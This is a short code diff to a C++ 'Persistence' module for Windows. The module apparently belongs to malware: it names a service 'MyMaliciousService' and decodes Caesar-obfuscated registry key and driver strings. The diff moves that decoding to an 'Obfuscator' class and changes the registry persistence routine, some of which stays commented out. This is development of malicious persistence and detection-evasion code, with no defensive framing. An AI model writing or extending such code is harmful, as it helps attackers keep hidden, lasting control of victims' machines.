@@ -2,10 +2,11 @@
 #include <string>
 #include "Persistence.h"
 #include "Utils.h"
+#include "Obfuscator.h"
 
 Persistence::Persistence() {
-    this->keyPath_str = Utils::StringToWstring(Crypt::decryptCaesar(this->keyPath, 0xDE));
-    this->driverLoaded_str = Utils::StringToWstring(Crypt::decryptCaesar(this->driverLoaded, 0xDE));
+    this->keyPath_str = Utils::StringToWstring(Obfuscator::DecryptCaesar(this->keyPath, 0xDE));
+    this->driverLoaded_str = Utils::StringToWstring(Obfuscator::DecryptCaesar(this->driverLoaded, 0xDE));
 
     std::wstring serviceName = L"MyMaliciousService";
     std::wstring serviceDisplayName = L"My Malicious Service";
@@ -65,6 +66,7 @@ BOOL Persistence::StartPersistence() {
     if (Persistence::IsRegistryKeyModified()) {
         return TRUE;
     }
+    return FALSE;
 
     /*if (Persistence::CreateRegistryKey()) {
         return Persistence::RegistryKeyModification();
